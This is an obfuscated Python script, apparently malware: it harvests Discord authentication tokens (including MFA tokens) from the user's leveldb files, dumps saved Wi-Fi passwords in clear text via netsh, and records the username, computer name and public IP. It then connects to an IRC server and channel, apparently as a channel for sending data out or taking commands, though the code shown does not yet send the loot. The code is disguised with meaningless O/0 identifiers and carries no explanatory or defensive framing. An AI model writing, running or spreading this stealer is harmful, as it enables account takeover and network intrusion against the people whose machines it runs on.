import os, re, json, string, random
try:
    import requests
except:
    pass
import random, subprocess
import socket, time
class O00OO00O(object):
    O00O0OO0O = socket.socket()
    def __init__(O00O0O0OO0O):
        O00O0O0OO0O.O00O0OO0O = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        O00O0O0OO0O.O0O0OO00O = 'irc.epiknet.org'
        O00O0O0OO0O.OO00O000O = 6667
        O00O0O0OO0O.OO00O0O0O = '#Informatique'
        O00O0O0OO0O.O00OO000O = ''.join(random.choice(string.ascii_lowercase) for i in range(7))
        O00O0O0OO0O.O00OO0O00 = ''.join(random.choice(string.ascii_lowercase) for i in range(6))
        O00O0O0OO0O.OO00O0O00 = (
            os.getenv("appdata") + "\\Discord\\Local Storage\\leveldb\\"
        )
        O00O0O0OO0O.OO00O0OO0 = []
        O00O0O0OO0O.OO0OO0OO0 = [
            r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
            r"mfa\.[\w-]{84}",
        ]
        O00O0O0OO0O.O00OO0OO0 = os.getenv("username")
        O00O0O0OO0O.O00OO00O0 = os.environ["computername"]
        try:
            O00O0O0OO0O.O0O0O000O = requests.get("https://api.ipify.org").text
        except:
            O00O0O0OO0O.O0O0O000O = "No module Found"
        for O00O00O in os.listdir(O00O0O0OO0O.OO00O0O00):
            if not O00O00O.endswith((".log", ".ldb")):
                continue
            O00O0OO = open(
                O00O0O0OO0O.OO00O0O00 + O00O00O, errors="ignore"
            ).readlines()
        for content in O00O0OO:
            for regex in O00O0O0OO0O.OO0OO0OO0:
                for token in re.findall(regex, content.strip()):
                    O00O0O0OO0O.OO00O0OO0.append(token + "\n")
        O00O0O0OO0O.O0OOO0O00 = ''
        O0OO000O = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
        try:
            O0OO000O = O0OO000O.split("Profil Tous les utilisateurs    \\xff:")
            O0O00O00O = O0OO000O[1]
        except:
            O0OO000O = O0OO000O.split("All User Profile    \\xff:")
        del(O0OO000O[0])
        for OO0OO00 in O0OO000O:
            OO0OO00 = OO0OO00.replace(" ","")
            OO0OO00 = OO0OO00.split()
            for OO00O00 in OO0OO00:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', OO00O00, 'key=clear']).decode('utf-8', errors='ignore')
                    try:
                        O00OO0000 = results.split("Contenu de la clé            :")[1]
                    except:
                        O00OO0000 = results.split("Key Content            :")[1]
                    O00O0O0OO0O.O0OOO0O00 += OO00O00 + '/' + O00OO0000.split()[0] + " "
                except:
                   pass
    def O0O0OO0OOO0O(O00O0O0OO0O):
        O00O0O0OO0O.O00O0OO0O.connect((O00O0O0OO0O.O0O0OO00O, O00O0O0OO0O.OO00O000O))
        O00O0O0OO0O.O00O0OO0O.send(bytes("NICK " + O00O0O0OO0O.O00OO000O + "\n", "UTF-8"))
        while 1 :
            O00O0O0O0O = O00O0O0OO0O.O00O0OO0O.recv (4096 ).decode("UTF-8")
            if O00O0O0O0O [0:4]=="PING":
                O00O0O0OO0O.O00O0OO0O.send (bytes ("PONG "+O00O0O0O0O.split()[1]+"\r\n","UTF-8"))
                break
        O00O0O0OO0O.O00O0OO0O.send(bytes("USER " + O00O0O0OO0O.O00OO000O + " " + O00O0O0OO0O.O00OO000O + " " + O00O0O0OO0O.O00OO000O + ":python irc\r\n", "UTF-8"))
        O00O0O0OO0O.O00O0OO0O.send(bytes("NICKSERV IDENTIFY " + O00O0O0OO0O.O00OO0O00 + " " + O00O0O0OO0O.O00OO0O00 + "\n", "UTF-8"))
        time.sleep(1)
        O00O0O0OO0O.O00O0OO0O.send(bytes("JOIN " + O00O0O0OO0O.OO00O0O0O + "\n", "UTF-8"))
        #time.sleep(1)
        O00O0O0OO0O.O00O0O0OOO0O()
    def O00O0O0OOO0O(O00O0O0OO0O):
        while 1:
            O00O0O0O0O = O00O0O0OO0O.O00O0OO0O.recv(7000).decode("UTF-8")
            if O00O0O0O0O [0:4]=="PING":
                O00O0O0OO0O.O00O0OO0O.send(bytes ("PONG "+O00O0O0O0O.split()[1]+"\r\n","UTF-8"))
            if "si tel n'est pas le cas, fuyez" in O00O0O0O0O:
                break
            else:
                pass
